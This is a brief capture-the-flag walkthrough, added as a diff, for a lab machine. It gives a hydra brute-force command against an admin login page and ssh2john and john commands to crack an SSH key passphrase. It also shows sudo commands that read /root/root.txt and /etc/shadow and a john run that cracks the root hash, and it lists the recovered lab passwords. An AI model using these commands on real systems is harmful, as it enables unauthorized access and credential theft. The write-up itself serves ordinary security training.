@@ -1,0 +1,20 @@
+Use this below command to brute force the password for the login page of admin
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.248.38 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
+admin:xavier
+
+and there you found the rsa key for john.
+So crack the rsa key by the following two commands
+{python /usr/share/john/ssh2john.py id_rsa > hash}
+ and 
+[sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt]
+  passphrase for key id_rsa:rockinroll
+  
+  use ssh into the john
+  
+ after logging in to get the content of the root.txt use this {sudo /bin/cat /root/root.txt}
+
+to get the password of the root run this command first sudo /bin/cat /etc/shadow  and then copy the root content make new file and save the root content there.
+the use this command to crack the hashes john rootBrute --wordlist=/usr/share/wordlists/rockyou.txt
+and there it gave us the password for root:football
+
+
